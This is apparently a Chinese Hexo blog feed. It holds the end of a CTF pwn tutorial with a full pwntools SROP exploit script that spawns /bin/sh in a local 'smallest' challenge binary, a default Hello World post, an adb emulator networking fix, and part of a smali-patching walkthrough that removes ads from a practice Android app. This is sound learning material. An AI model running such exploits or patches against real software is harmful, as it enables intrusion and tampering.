400</span><br></pre></td></tr></table></figure><p>RAX是1的时候执行write写入指令，执行的参数如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(0,RSP,400)</span><br></pre></td></tr></table></figure><p>写入屏幕RSP的值，并且是从RSP开始写400个数据，这样我们就拿到了RSP的指，我们后面写入<code>binsh</code>就可以根据这个地址来确定地址，此时进入到第三个<code>0x4000B0</code>中，这个时候我们需要通过signal机制触发一个写入系统调用，写入的位置就是基于刚才写回来的地址，需要多写一些垃圾数据，记住他的位置，如果直接写入binsh会被覆盖掉，binsh写入之后再次通过signal机制触发<code>execve</code>命令执行，并且写入我们刚才写入binsh的位置即可拿到sh。</p><h3 id="攻击脚本-7"><a href="#攻击脚本-7" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line">syscall_addr = <span class="number">0x4000BE</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.send(&quot;\xbb&quot;)</span></span><br><span class="line">io.send(p8(<span class="number">0xBB</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">addr = io.recv()</span><br><span class="line">rsp_addr = <span class="built_in">hex</span>(u64(addr[<span class="number">16</span>:<span class="number">24</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(addr[<span class="number">16</span>:<span class="number">24</span>])))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read binsh</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = u64(addr[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">sigframe.rdx = <span class="number">0x200</span></span><br><span class="line">sigframe.rsp = u64(addr[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(start_addr) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + <span class="built_in">bytes</span>(sigframe))</span><br><span class="line">io.send(p64(syscall_addr) + <span class="string">b&quot;b&quot;</span> * <span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = p64(start_addr).ljust(<span class="number">0x120</span>, <span class="string">b&quot;b&quot;</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = u64(addr[<span class="number">16</span>:<span class="number">24</span>]) + <span class="number">0x120</span></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = u64(addr[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + <span class="built_in">bytes</span>(sigframe)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(p64(syscall_addr) + <span class="string">b&quot;b&quot;</span> * <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><h1 id="其他辅助性漏洞"><a href="#其他辅助性漏洞" class="headerlink" title="其他辅助性漏洞"></a>其他辅助性漏洞</h1><h2 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h2><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h2 id="金丝雀防护绕过"><a href="#金丝雀防护绕过" class="headerlink" title="金丝雀防护绕过"></a>金丝雀防护绕过</h2><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>PWN的学习相对于其他的方向来说我认为是非常费劲，但是学会之后的利用相比于其他方向还是更容易懂的。对于pwn很多地方都需要自己去做调试(栈还好，到堆不仅得使劲去调，还得读glibc源码)，去想构造的exp每一步执行之后的栈结构，不然很难去理解他真正干了什么事，然后还是学习需要一些汇编基础，没有的话学起来会更加的费劲。还有就是这个东西还是坚持比较重要，坚持下去肯定是会有结果的。本文是我自己学习过程中的一些总结，基于博主的进度，后续的其他内容会根据博主的学习进度进行补充，有些部分理解的可能并不完全对，欢迎师傅指正。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>题目相关的全都已经加入在题目来源上了，然后下面是学习栈相关的视频</p><blockquote><p>CTF-WIKI: <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a><br>XMCVE 2020 CTF Pwn入门课程: <a href="https://www.bilibili.com/video/BV1854y1y7Ro">https://www.bilibili.com/video/BV1854y1y7Ro</a><br>国资社畜-你想有多PWN(不再更新): <a href="https://www.bilibili.com/video/BV1mr4y1Y7fW">https://www.bilibili.com/video/BV1mr4y1Y7fW</a><br>yichen小菜鸡-CTF学习系列: <a href="https://space.bilibili.com/24337218/lists/393118?type=series">https://space.bilibili.com/24337218/lists/393118?type=series</a><br>PolarCTF入门系列讲座-PWN篇: <a href="https://www.bilibili.com/video/BV1ub4y1F71R">https://www.bilibili.com/video/BV1ub4y1F71R</a></p></blockquote>]]></content>
    
    
    <summary type="html">栈基础知识
栈基础概念
栈是程序运行时的一块区域，主要用于存储临时数据、管理函数调用和返回地址。他有很多的特点，他是一种后进先出的数据结构，操作主要有压栈与出栈两种，并且在程序的内存中他的数据是从高地址往低地址走的。简单说，就是程序运行时的“临时记事本”。


栈顶与栈底
对于栈有两个比较重要的寄存器，一个是栈顶一个是栈顶，在32位操作系统中，寄存器EBP表示栈底，ESP表示栈顶。栈底代表当前栈的最开始的位置，栈顶很好理解，就是栈的最顶部，在操作栈的时候主要分为压栈和出栈，具体是下面两个汇编指令

1
2


push ebx  # 压栈，ebx的数据压入栈顶，并且ESP(栈顶) + size</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="PWN" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/PWN/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
    <category term="PWN" scheme="https://blog.boychai.xyz/tags/PWN/"/>
    
    <category term="栈溢出" scheme="https://blog.boychai.xyz/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="栈漏洞" scheme="https://blog.boychai.xyz/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="ROP" scheme="https://blog.boychai.xyz/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://blog.boychai.xyz/2025/04/28/hello-world/"/>
    <id>https://blog.boychai.xyz/2025/04/28/hello-world/</id>
    <published>2025-04-28T20:31:00.000Z</published>
    <updated>2025-07-17T05:40:18.601Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">网站从Typecho&amp;Handsome迁移到Hexo&amp;Next，后面会把质量较高的文章陆续迁移到当前网站。</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>虚机adb连接安卓模拟器</title>
    <link href="https://blog.boychai.xyz/2025/03/20/%E8%99%9A%E6%9C%BAadb%E8%BF%9E%E6%8E%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
    <id>https://blog.boychai.xyz/2025/03/20/%E8%99%9A%E6%9C%BAadb%E8%BF%9E%E6%8E%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8/</id>
    <published>2025-03-20T17:04:00.000Z</published>
    <updated>2025-07-17T05:40:18.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h1><p>博主用的是雷电模拟器+VMware-Ubuntu虚拟机，雷电模拟器有自己的内部网络，然后虚机用的网络模式也是NAT，因为对这个安卓模拟器的网络结构不是很了解，我尝试直接通过虚机去adb连接NAT内宿主机的IP，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">boychai@lab:~$ <span class="built_in">sudo</span> adb connect 10.0.0.1:5555</span><br><span class="line">failed to connect to 10.0.0.1:5555</span><br></pre></td></tr></table></figure><p>连接是失败的，也尝试过通过打开雷电模拟器的远程ADB调试，依旧是失败的。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>这里找到了一个通用的解决方案，只要是两个设备网络可以联通即可实现adb的连接，不去别于设备是否为虚机、模拟器、实机，只要是在同网络下都可行。以雷电模拟器为例，在<code>设置</code>-&gt;<code>网络</code>中有两个选项，第一个是网络连接，默认是开启的，然后第二个是网络桥接模式，把这个打开，第一次打开可能需要安装驱动，跟随提示点击即可，开启后如下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250320163220.png"><br>桥接的网卡，需要选择对应设备可以联通的网络，保存后重启。重启过后安装<code>WiFi ADB - Debug Over Air 2.1.3</code>这个软件，开启后即可看到连接IP与端口，如下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250320163652.png"><br>安卓模拟器是桥接的我本地WIFI，我虚机的网络是在VMware的NAT网络模式下的，虽然套了一层，但是NAT网络模式下的虚机依旧可以访问到我本地WIFI的所有设备，所以直接通过他给的这个命令就可以直接连接，结果如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250320164112.png"></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p><code>WiFi ADB - Debug Over Air 2.1.3</code>这个软件的官方维护地址没有找到，我是通过下面链接获取到的这个软件，软件链接与原文链接如下<br>软件原文： <a href="https://bbs.kanxue.com/thread-257380.htm">https://bbs.kanxue.com/thread-257380.htm</a><br>软件链接： <a href="https://boychai.lanzout.com/ifxiz2r57bra">https://boychai.lanzout.com/ifxiz2r57bra</a> 密码:52pj</p>]]></content>
    
    
    <summary type="html">问题复现
博主用的是雷电模拟器+VMware-Ubuntu虚拟机，雷电模拟器有自己的内部网络，然后虚机用的网络模式也是NAT，因为对这个安卓模拟器的网络结构不是很了解，我尝试直接通过虚机去adb连接NAT内宿主机的IP，命令如下

1
2


boychai@lab:~$ sudo adb connect 10.0.0.1:5555
failed to connect to 10.0.0.1:5555


连接是失败的，也尝试过通过打开雷电模拟器的远程ADB调试，依旧是失败的。

解决方案
这里找到了一个通用的解决方案，只要是两个设备网络可以联通即可实现adb的连接，不去别于设备是否为虚机、模</summary>
    
    
    
    <category term="问题解决" scheme="https://blog.boychai.xyz/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
    <category term="问题解决" scheme="https://blog.boychai.xyz/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    <category term="adb" scheme="https://blog.boychai.xyz/tags/adb/"/>
    
    <category term="Android" scheme="https://blog.boychai.xyz/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>记一次安卓逆向学习实践-去除广告</title>
    <link href="https://blog.boychai.xyz/2025/03/18/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5-%E5%8E%BB%E9%99%A4%E5%B9%BF%E5%91%8A/"/>
    <id>https://blog.boychai.xyz/2025/03/18/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5-%E5%8E%BB%E9%99%A4%E5%B9%BF%E5%91%8A/</id>
    <published>2025-03-18T17:52:00.000Z</published>
    <updated>2025-07-17T05:40:18.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>相关教程： <a href="https://www.bilibili.com/video/BV1wT411N7sV">https://www.bilibili.com/video/BV1wT411N7sV</a><br>相关帖子： <a href="https://www.52pojie.cn/thread-1706691-1-1.html">https://www.52pojie.cn/thread-1706691-1-1.html</a><br>相关附件可以从相关帖子中拿到地址，这里不多说环境相关的内容了。</p><h1 id="广告展示"><a href="#广告展示" class="headerlink" title="广告展示"></a>广告展示</h1><p>打开软件的第三关，打开之后有一个等待三秒的提示如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318190334.png"><br>提示完毕之后的内容是一号弹窗<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318190400.png"></p><h1 id="广告去除"><a href="#广告去除" class="headerlink" title="广告去除"></a>广告去除</h1><h2 id="给爷停三秒"><a href="#给爷停三秒" class="headerlink" title="给爷停三秒"></a>给爷停三秒</h2><p>在MT管理器的Activity的记录中，找到下面内容<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318193458.png"><br>这代表当前等待的这个页面的名字是AdActivity，我们通过jadx-gui找到这个位置<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318193630.png"><br>查看这个函数发现下面java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AdActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.ad_activity);</span><br><span class="line">        loadAd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">jump</span><span class="params">()</span> &#123;</span><br><span class="line">        startActivity(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, (Class&lt;?&gt;) ChallengeThird.class));</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">loadAd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>().postDelayed(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123; <span class="comment">// from class: com.zj.wuaipojie.ui.AdActivity$$ExternalSyntheticLambda0</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// java.lang.Runnable</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                AdActivity.<span class="built_in">this</span>.jump();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">3000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的<code>onCreate</code>是这个组件声明周期的一部分，代码会优先走到这里，然后调用<code>loadAd</code>函数，<code>loadAd</code>函数的主要内容是延迟3000毫秒之后执行自己的<code>jump</code>函数，这里的3000毫秒估计就是咱们打开页面等待的那个3秒，对应起来了，我们需要修改这个地方，改成0即可跳过，我们去看他的smali代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">private</span> <span class="keyword">final</span> <span class="title function_">loadAd</span><span class="params">()</span>V</span><br><span class="line">    .registers <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">27</span></span><br><span class="line">    <span class="keyword">new</span>-instance v0, Landroid/os/Handler;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0&#125;, Landroid/os/Handler;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>-instance v1, Lcom/zj/wuaipojie/ui/AdActivity$$ExternalSyntheticLambda0;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v1, p0&#125;, Lcom/zj/wuaipojie/ui/AdActivity$$ExternalSyntheticLambda0;-&gt;&lt;init&gt;(Lcom/zj/wuaipojie/ui/AdActivity;)V</span><br><span class="line"></span><br><span class="line">    const-wide/<span class="number">16</span> v2, <span class="number">0xbb8</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v1, v2, v3&#125;, Landroid/os/Handler;-&gt;postDelayed(Ljava/lang/Runnable;J)Z</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>在<code>const-wide/16 v2, 0xbb8</code>这里有一个<code>0xbb8</code>估计就是他的延迟时间了，他这个是16进制的数值，转换成10进制刚好就是<code>3000</code>，这里我们通过np管理器给他修改以下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318194727.png"><br>保存之后再此打开应用，发现这个页面直接跳过了</p><h2 id="一号、二号广告已就位"><a href="#一号、二号广告已就位" class="headerlink" title="一号、二号广告已就位"></a>一号、二号广告已就位</h2><p>跳过上面暂停3秒的页面之后来到了这里，出现了一号广告位，通过MT管理器的Activity的记录得知他的页面名字是<code>ChallengeThird</code>，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318194906.png"><br>好，我们继续通过jadx去分析，通过搜索窗体名称，也可以通过字符串搜到这里，找到这个函数<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318195140.png"><br>打开代码直接就能发现下面源代码，二号广告位也在这里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_challenge_third);</span><br><span class="line">        <span class="type">ChallengeThird</span> <span class="variable">challengeThird</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">        AlertDialog.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(challengeThird);</span><br><span class="line">        builder.setTitle(<span class="string">&quot;这是二号广告标题&quot;</span>);</span><br><span class="line">        builder.setMessage(<span class="string">&quot;这是二号广告内容&quot;</span>);</span><br><span class="line">        builder.setCancelable(<span class="literal">false</span>);</span><br><span class="line">        builder.setPositiveButton(<span class="string">&quot;前往论坛&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123; <span class="comment">// from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">                ChallengeThird.m43onCreate$lambda2$lambda0(ChallengeThird.<span class="built_in">this</span>, dialogInterface, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        builder.setNegativeButton(<span class="string">&quot;退出软件&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123; <span class="comment">// from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda2</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        builder.show();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CommonDialog</span>.Builder(challengeThird).setMessage(<span class="string">&quot;一号广告弹窗已就位&quot;</span>).setNegativeButton(<span class="string">&quot;退出软件&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123; <span class="comment">// from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda3</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).setMessageColor(ViewCompat.MEASURED_STATE_MASK).setPositiveButton(<span class="string">&quot;前往论坛&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123; <span class="comment">// from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda0</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">                ChallengeThird.m46onCreate$lambda4(ChallengeThird.<span class="built_in">this</span>, dialogInterface, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).setWith(<span class="number">0.8f</span>).create().show();</span><br><span class="line">        checkUpdate();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>分析一下代码发现这两个弹窗刚好对应着俩<code>show()</code>函数，他一个窗口是通过<code>builder</code>对象创建的，还有一个是通过直接new到头然后直接执行的<code>show()</code>，好，拿到这个信息我们思路就清晰了，把这俩show函数给注释掉估计就成功了，我们再看一下这俩show在<code>smali</code>的什么位置，这里<code>smali</code>很长，我直接用图片展示了，下图是一号窗口的show函数位置<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318195828.png"><br>然后在38行又可以直接找到另外一个<code>show()</code><br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318195924.png"><br>他们在smali的函数分别是<code>284</code>和<code>334</code>，我们去NP中给他注释掉，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318200256.png"><br>注释之后保存，打开软件，这两条确实是消失了，但是又有一个图片类型的广告<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250318200438.png"></p><h2 id="图片横幅广告"><a 